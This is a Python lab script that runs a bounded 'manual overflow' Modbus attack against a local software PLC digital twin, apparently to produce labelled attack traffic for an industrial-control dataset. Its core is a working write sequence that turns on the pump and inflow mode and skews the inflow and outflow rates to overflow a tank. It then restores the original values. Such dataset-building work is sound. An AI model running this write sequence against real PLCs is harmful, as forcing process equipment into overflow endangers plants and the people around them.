#!/usr/bin/env python3
"""Bounded manual-overflow scenario for the local Aloha software PLC.

Safety scope
------------
This program is deliberately restricted to the Docker service name ``aloha-plc``
on TCP port 5020. There is no command-line override for another host. It is
intended only for the local software Digital Twin used by the dataset lab.

The program snapshots the four control points it changes, applies the bounded
scenario, observes the process, and restores the original control values before
exit. Exactly one JSON object is written to stdout so the PowerShell runner can
persist it as attack_stats.json.
"""

from __future__ import annotations

import argparse
import json
import time
from datetime import datetime, timezone
from typing import Any, Callable

from pymodbus.client import ModbusTcpClient

LAB_HOST = "aloha-plc"
LAB_PORT = 5020
UNIT_ID = 1


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def invoke(method: Callable[..., Any], **kwargs: Any) -> Any:
    """Support current and older pymodbus keyword naming."""
    try:
        return method(device_id=UNIT_ID, **kwargs)
    except TypeError:
        return method(slave=UNIT_ID, **kwargs)


def main() -> int:
    ap = argparse.ArgumentParser(description="Local-only Modbus process manipulation scenario")
    ap.add_argument("--duration", type=float, default=30.0)
    ap.add_argument("--sample-interval", type=float, default=1.0)
    ap.add_argument("--inflow-rate", type=int, default=900)
    ap.add_argument("--outflow-rate", type=int, default=50)
    args = ap.parse_args()

    if args.duration <= 0:
        raise SystemExit("--duration must be > 0")
    if args.sample_interval <= 0:
        raise SystemExit("--sample-interval must be > 0")
    if not (0 <= args.inflow_rate <= 65535 and 0 <= args.outflow_rate <= 65535):
        raise SystemExit("flow values must fit one unsigned 16-bit Modbus register")
    if args.inflow_rate <= args.outflow_rate:
        raise SystemExit("inflow-rate must be greater than outflow-rate for this scenario")

    stats: dict[str, Any] = {
        "session_started_utc": utc_now(),
        "attack_started_utc": None,
        "attack_ended_utc": None,
        "ended_utc": None,
        "scenario_id": "MODBUS-MANIP-001",
        "attack_type": "manual_overflow",
        "data_origin": "local_software_digital_twin",
        "host": LAB_HOST,
        "port": LAB_PORT,
        "unit_id": UNIT_ID,
        "duration_seconds": args.duration,
        "sample_interval_seconds": args.sample_interval,
        "requested_values": {
            "pump_switch_coil_1": 1,
            "inflow_mode_coil_5": 1,
            "inflow_rate_hr_6": args.inflow_rate,
            "outflow_rate_hr_7": args.outflow_rate,
        },
        "baseline": {},
        "restored": False,
        "restore_scope": "control_points_only",
        "restore_errors": [],
        "coil_reads_attempted": 0,
        "coil_reads_ok": 0,
        "holding_reads_attempted": 0,
        "holding_reads_ok": 0,
        "write_coil_attempted": 0,
        "write_coil_ok": 0,
        "write_register_attempted": 0,
        "write_register_ok": 0,
        "requests_attempted": 0,
        "requests_ok": 0,
        "errors": 0,
        "observations": {
            "samples": 0,
            "initial_tank_level": None,
            "max_tank_level": None,
            "final_tank_level_before_restore": None,
            "overflow_alarm_seen": False,
        },
    }

    client = ModbusTcpClient(LAB_HOST, port=LAB_PORT, timeout=2.0)

    def note_error() -> None:
        stats["errors"] += 1

    def read_coils(address: int, count: int):
        stats["coil_reads_attempted"] += 1
        stats["requests_attempted"] += 1
        try:
            result = invoke(client.read_coils, address=address, count=count)
            if result.isError():
                note_error()
                return None
            stats["coil_reads_ok"] += 1
            stats["requests_ok"] += 1
            return [bool(v) for v in result.bits[:count]]
        except Exception:
            note_error()
            return None

    def read_holding(address: int, count: int):
        stats["holding_reads_attempted"] += 1
        stats["requests_attempted"] += 1
        try:
            result = invoke(client.read_holding_registers, address=address, count=count)
            if result.isError():
                note_error()
                return None
            stats["holding_reads_ok"] += 1
            stats["requests_ok"] += 1
            return list(result.registers[:count])
        except Exception:
            note_error()
            return None

    def write_coil(address: int, value: bool) -> bool:
        stats["write_coil_attempted"] += 1
        stats["requests_attempted"] += 1
        try:
            result = invoke(client.write_coil, address=address, value=value)
            if result.isError():
                note_error()
                return False
            stats["write_coil_ok"] += 1
            stats["requests_ok"] += 1
            return True
        except Exception:
            note_error()
            return False

    def write_register(address: int, value: int) -> bool:
        stats["write_register_attempted"] += 1
        stats["requests_attempted"] += 1
        try:
            result = invoke(client.write_register, address=address, value=value)
            if result.isError():
                note_error()
                return False
            stats["write_register_ok"] += 1
            stats["requests_ok"] += 1
            return True
        except Exception:
            note_error()
            return False

    baseline_coils = None
    baseline_regs = None
    exit_code = 0

    try:
        if not client.connect():
            note_error()
            return 2

        baseline_coils = read_coils(0, 9)
        baseline_regs = read_holding(0, 10)
        if baseline_coils is None or baseline_regs is None:
            return 3

        stats["baseline"] = {
            "pump_switch_coil_1": int(baseline_coils[1]),
            "inflow_mode_coil_5": int(baseline_coils[5]),
            "inflow_rate_hr_6": int(baseline_regs[6]),
            "outflow_rate_hr_7": int(baseline_regs[7]),
            "tank_level_hr_0": int(baseline_regs[0]),
        }
        stats["observations"]["initial_tank_level"] = int(baseline_regs[0])
        stats["observations"]["max_tank_level"] = int(baseline_regs[0])

        # Documented Aloha manual-overflow control sequence.
        # The exact attack window starts immediately before the first write.
        stats["attack_started_utc"] = utc_now()
        writes_ok = [
            write_coil(1, True),
            write_coil(5, True),
            write_register(6, args.inflow_rate),
            write_register(7, args.outflow_rate),
        ]
        if not all(writes_ok):
            exit_code = 4
            return exit_code

        deadline = time.monotonic() + args.duration
        while time.monotonic() < deadline:
            cycle_start = time.monotonic()
            regs = read_holding(0, 10)
            coils = read_coils(0, 9)

            if regs is not None:
                tank = int(regs[0])
                stats["observations"]["samples"] += 1
                stats["observations"]["final_tank_level_before_restore"] = tank
                current_max = stats["observations"]["max_tank_level"]
                if current_max is None or tank > current_max:
                    stats["observations"]["max_tank_level"] = tank
                if len(regs) > 9 and int(regs[9]) != 0:
                    stats["observations"]["overflow_alarm_seen"] = True

            if coils is not None and len(coils) > 6 and coils[6]:
                stats["observations"]["overflow_alarm_seen"] = True

            elapsed = time.monotonic() - cycle_start
            time.sleep(max(0.0, args.sample_interval - elapsed))

    finally:
        # Cleanup writes stay inside the recorded attack window. This ensures
        # attacker-originated restoration packets are not labeled normal.
        if baseline_coils is not None and baseline_regs is not None:
            restore_results = [
                ("inflow_rate_hr_6", write_register(6, int(baseline_regs[6]))),
                ("outflow_rate_hr_7", write_register(7, int(baseline_regs[7]))),
                ("inflow_mode_coil_5", write_coil(5, bool(baseline_coils[5]))),
                ("pump_switch_coil_1", write_coil(1, bool(baseline_coils[1]))),
            ]
            stats["restore_errors"] = [name for name, ok in restore_results if not ok]
            stats["restored"] = not stats["restore_errors"]
            if stats["restore_errors"] and exit_code == 0:
                exit_code = 5

        if stats.get("attack_started_utc") is not None:
            stats["attack_ended_utc"] = utc_now()

        try:
            client.close()
        except Exception:
            pass

        stats["ended_utc"] = utc_now()
        print(json.dumps(stats, separators=(",", ":")))

    return exit_code


if __name__ == "__main__":
    raise SystemExit(main())
